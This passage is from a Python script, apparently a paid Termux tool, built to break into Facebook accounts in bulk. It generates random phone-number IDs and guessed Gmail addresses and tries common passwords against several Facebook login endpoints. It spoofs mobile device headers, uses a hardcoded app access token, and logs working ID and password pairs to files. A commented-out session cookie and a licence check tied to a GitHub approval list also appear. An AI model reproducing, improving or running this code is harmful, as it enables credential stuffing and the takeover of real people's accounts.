		code = input('\033[1;32m put code: ')
		try:
			limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;91m put limit: '))
		except ValueError:
			limit = 5000
		linex()
		print(' [1] Method 1\n [2] Method 2 Best ')
		linex()
		mthd = input(' Choose: ')
		linex()
		print(' [1] Clone with 7+11 digit pass (v-fast)\n [2] Clone with auto pass (fast)\n [3] Clone with auto pass v2 (slow-best) ')
		linex()
		pcs = input(' [?] Select: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as AXI:	
			clear()
			tl = str(len(user))
			print(' Total idz : \033[1;32m'+tl+f' ')
			print(f'\033[1;32m Your selected code ..:\033[1;32m '+code)
			print(f'\033[1;32m \x1b[38;5;208mif you Show no result use flight mode\033[1;97m')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids]
				elif pcs in ['2','02']:
					passlist = [psx,ids,'khankhan','khan1122','Ali786','khan1234']
				else:
					passlist = [psx,ids,'khankhan','khan1122','Ali786','khan1234','Ali123','ali786','khan123','khan12345']
				if mthd in ['1','01']:
					AXI.submit(rcrack1,ids,passlist)
				else:
					AXI.submit(rcrack,ids,passlist)
		print('\033[1;91m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python MXS.py')
def bd():
		user=[]
		clear()
		print('\033[1;32m Code example: 016,017,018,019')
		code = input('\033[1;32m put code: ')
		try:
			limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;91m put limit: '))
		except ValueError:
			limit = 5000
		linex()
		print(' [1] Method 1\n [2] Method 2 Best ')
		linex()
		mthd = input(' Choose: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(8))
			user.append(nmp)
		with tred(max_workers=30) as AXI:	
			clear()
			tl = str(len(user))
			print(' Total idz : \033[1;32m'+tl+f' ')
			print(f'\033[1;32m Choice code ..:\033[1;32m '+code)
			print(f'\033[1;32m \x1b[38;5;208mUse flight mode for best result\033[1;97m')
			linex()
			for psx in user:
				ids = code+psx
				passlist = [psx,ids]
				if mthd in ['1','01']:
					AXI.submit(rcrack1,ids,passlist)
				else:
					AXI.submit(rcrack,ids,passlist)
		print('\033[1;91m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python MXS.py')
def gmail():
		os.system('rm -rf .re.txt')
		clear()
		print('\033[1;32m example: muhammad, ali, sajjad, faizan , Awais\033[1;97m')
		linex()
		first = input(' Put first name: ')
		linex()
		print('\033[1;32m example: khan, ahmad, ali \033[1;97m')
		linex()
		last = input(' Put last name: ')
		linex()
		print(' Example: @gmail.com , @yahoo.com etc...')
		linex()
		domain = input(' domain: ')
		linex()
		try:
			limit=int(input(' Put limit: '))
		except ValueError:
			limit = 5000
		linex()
		print(' [1] Only name password \n [2] name + digit password \n [3] Capital name password\n [4] Auto all password')
		linex()
		pxc = input(' Choose : ')
		linex()
		print(' [1] Method 1\n [2] Method 2 ')
		linex()
		mthd = input(' Choose: ')
		linex()
		print(' Getting gmails...')
		lists = ['3','4']
		for xd in range(limit):
			lchoice = random.choice(lists)
			if '3' in lchoice:
				mail = ''.join(random.choice(string.digits) for _ in range(3))
				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
			else:
				mail = ''.join(random.choice(string.digits) for _ in range(4))
				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
			fo = open('.re.txt', 'r').read().splitlines()
		with tred(max_workers=30) as AXI:
			total = str(len(fo))
			clear()
			print(' Total idz : \033[1;32m'+total+f' ')
			print("\033[1;91m \x1b[38;5;208mUse flight mode for Best result\033[1;91m")
			linex()
			for user in fo:
				ids,names = user.split('|')
				first_name = names.rsplit(' ')[0]
				try:
					last_name = names.rsplit(' ')[1]
				except IndexError:
					last_name = 'Khan'
				fs = first_name.lower()
				ls = last_name.lower()
				if pxc in ['1','01']:
					passlist = [fs+ls,fs+' '+ls,fs]
				elif pxc in ['2','02']:
					passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122']
				elif pxc in ['3','03']:
					passlist = [first_name+last_name,first_name+' '+last_name,first_name+'123']
				else:
					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
				if mthd in ['1','01']:
					AXI.submit(rcrack1,ids,passlist)
				else:
					AXI.submit(rcrack,ids,passlist)
		print('\033[1;91m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python MXS.py')

def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [JANI906] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=kwo_ZK2n_AzY79we3ChRWSdJ; sb=1hY_ZOcWDt66JxD0sU_TXiYz; wd=393x666; dnonce=AWnFwfD3QJMZ_oNKZd8f30MDh_kTlT2omJf8G1MP7ejKIb3v7xKfTwkXuvHWH_zSlsSqNze93ZX10xVrnN7xDj2I; c_user=100092300443250; xs=49%3A6YFxnBmadphoaQ%3A2%3A1682974354%3A-1%3A-1; fr=0Gr0OM8MADEUjG75S.AWW4qL5C-tSys7OXiFdiOFdjSHI.BkPxcH.2X.AAA.0.0.BkUCaS.AWU7ixxk97Q; m_page_voice=100092300443250; zsh=ASS5VYmaLgO-2wqok532gX-kkJZ1Tke75GClA_znm-_MTVZGmW6w_4AGgk-u6p3iv2bc0_0A6mYwefFsBsQuCbn2Of4KUQIa_SJkVG9hsFBerePaKUZz600ubdwVTwbdj6UtcGsTYSdjOR1km9lQsi29dDB0Nxb9drDwl5vQ4ZdR13X8yn-WSjBe_KeAMsicXlcmm0QdQK6uOzh9je5z0eNapGE2WFfRFh1GBWpRfMUtL2burjokSr59nLenCGC8tIPbasWP5OTOqD8vw3DtZF-HKD0pmmJ2W4-3m1SD02b7UnYG3VohwAki7tYGqsCfXg',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
}
			getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			AXI=session.cookies.get_dict().keys()
			if "c_user" in AXI:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [MXS-OK] %s | %s'%(ids,pas))
				open('/sdcard/MXS-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [MXS-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/MXS-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
def rcrack1(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [RANDOM [1] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			__iam_genius = random.choice(android_models)
			phone_model = __iam_genius.split('|')[0]
			phone_company = __iam_genius.split('|')[1]
			dimensions = __iam_genius.split('|')[2]
			ffb=random.choice(fbks)
			dvlk = random.choice(usr)
			ua=random.choice(ugen)
			ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/11;;FBDM/'+'{density=3.0,height=360,width=800};]'
			li = ['28','29','210']
			li2 = random.choice(li)
			j1 = ''.join(random.choice(digits) for _ in range(2))
			j2 = li2+j1
			device_family_id = str(uuid.uuid4())
			adid = str(uuid.uuid4())
			machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
			data = {'adid':adid,
			'format':'json',
			'device_id':device_family_id,
			'email':ids,
			'password':pas,
			'generate_analytics_claim':'1',
			'community_id':'','cpl':'true','try_num':'1',
			'family_device_id':device_family_id,
			'credentials_type':'device_based_login_password',
			'generate_session_cookies':'1',
			'error_detail_type':'button_with_disabled',
			'source':'device_based_login',
			'machine_id':machine_id,
			'login_location_accuracy_m':'1.0',
			'meta_inf_fbmeta':'',
			'advertiser_id':adid,
			'encrypted_msisdn':'',
			'currently_logged_in_userid':'0',
			'locale':'en_PK',
			'client_country_code':'PK',
			'method':'auth.login',
			'fb_api_req_friendly_name':'authenticate',
			'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
			'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
			head = {
			'content-type':'application/x-www-form-urlencoded',
			'x-fb-sim-hni':str(random.randint(2e4,4e4)),
			'x-fb-connection-type':'unknown',
			'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
			'user-agent':pro,
			'x-fb-net-hni':str(random.randint(2e4,4e4)),
			'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
			'x-fb-connection-quality':'EXCELLENT',
			'x-fb-friendly-name':'authenticate',
			'accept-encoding':'gzip, deflate',
			'x-fb-http-engine':	'Liger'}
			url = 'https://b-api.facebook.com/method/auth.login'
			po = requests.post(url,data=data,headers=head,allow_redirects=False).text
			q = json.loads(po)
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [MXS-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/MXS-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;208m [MXS-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/MXS-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
	except Exception as e:
		pass
def rcrack(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [RANDOM >2< ] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			pro = random.choice(ugen)
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
			"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":ids,
			"pass":pas,
			"login":"Log In"}
			header_freefb = {'authority':'web.facebook.com',
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"macOS"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent':pro
}
			lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[7:22]
				if uid in oks:pass
				else:
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [MXS-TL] '+ids+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [MXS-OK] '+ids+' | '+pas)
						cek_apk(session,coki)
						open('/sdcard/MXS-OK.txt', 'a').write(ids+'|'+pas+'\n')
						oks.append(uid)
						break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[24:39]
				if uid in cps:pass
				else:
					print('\r\r\x1b[38;5;208m [MXS-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/MXS-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
	except:
		pass

def menu_apikey():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://github.com/Maliksohaill/ZiDi-MALIK/blob/main/aprrovel.txt').text
  
 

  os.system(" clear")                                               
  print("""\033[1;37m
    ___      ___  ___  ___   ________  
|"  \    /"  ||"  \/"  | /"       ) 
 \   \  //   | \   \  / (:   \___/  
 /\\  \/.    |  \\  \/   \___  \    
|: \.        |  /\.  \    __/  \\   
|.  \    /:  | /  \   \  /" \   :)  
|___|\__/|___||___/\___|(_______/ 
 \033[1;93m=================================================
\033[1;37m[-] AUTHOR    :\033[1;32m MALIK SOHAIL
\033[1;37m[-] GITHUB    :\033[1;32m JANI906
\033[1;37m[-] WhatsApp  :\033[1;32m +923077681556 
\033[1;37m[-] TOOLS     :\033[1;32m MIX CLONING
\033[1;37m[-] VERSION   :\033[1;32m 23.0
\033[1;37m[-] STATUS    :\033[1;32m PAID
==================================================
\033[1;33m[*]TOOLS  : Facebook cloning
\033[1;37m[*]Status : PAID
==================================================
 \33[37;41m\t IF YOU ARE FREE USE COME TO INBOX\33[0;m
\033[1;93m=================================================
 \033[1;35m[*]First read NOTE:
 \033[1;37m[1]if facebook go on update you get not
 \033[1;37m[*]Ok idz we dont  responsible 
 \033[1;37m[2]you unstall termux and key need approval
================================================== 
 [*] File cloning
 [*] Create file
 [*] Public cloning
 [*] Random cloning
 [*] Gmail cloning
 [*] Separate ids
 [*] remove dublicate lines from file  
 [*] login another cookie
 [*] contact with owner
 [0] Exit menu
==================================================   """)

  print("\t \033[1;37m  FIRST GET APPROVEL\033[1;37m ")
  print("")
  print(" \033[1;37m  THIS TOOLS IS PAID SO YOU NEED GET APPROVED FIRST\033[1;37m\n")
  print("")
  print("\x1b[1;97m   contact Admin to Buy this Tools                                                               ");time.sleep (0.1) 
  print("")
  print("\033[1;37     YOUR  KEY : "+id)
  print("")
  print("\033[1;37m   COPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)
  print("")
  print("  SEND KEY ON ADMIN WHATSAPP,,,,,,,,,,,,,,,,,    ");time.sleep(1)
  os.system('xdg-open https://wa.me/+923077681556')
  print("");time.sleep(2)
  print("\x1b[1;97m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/Maliksohaill/ZiDi-MALIK/blob/main/aprrovel.txt").text
    if id in httpCaht:
      print("\033[1;97m   YOUR TOKEN APROVED DONE ");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:
      
      print("\x1b[1;97m    Sorry Bro Token Key not APROVED˜“")
      print("    Send payment to Admin and get aproval"); time.sleep(2)
      os.system('xdg-open https://wa.me/+923077681556')
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	menu_apikey()
menu_apikey() 



def tnx():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://github.com/Maliksohaill/ZiDi-MALIK/blob/main/aprrovel.txt').text
  
 

  os.system(" clear ")
  print(logo)
  print(" Wait bro,,,, ")
  print(" Chacking Your Aproval ")
  print("\x1b[1;97m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/Maliksohaill/ZiDi-MALIK/blob/main/aprrovel.txt").text
    if id in httpCaht:
      print("\033[1;97m   YOUR TOKEN APROVED ðŸ¥€ ");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:
      
      print("\x1b[1;97m    Sorry Bro Your Token not AprovedðŸ˜“ ")
      print("    Send payment to Admin and get aproval"); time.sleep(2)
      os.system('xdg-open https://wa.me/+923077681556')
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__': 
    	print(logo)
    	menu_apikey()
try:
	menu()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()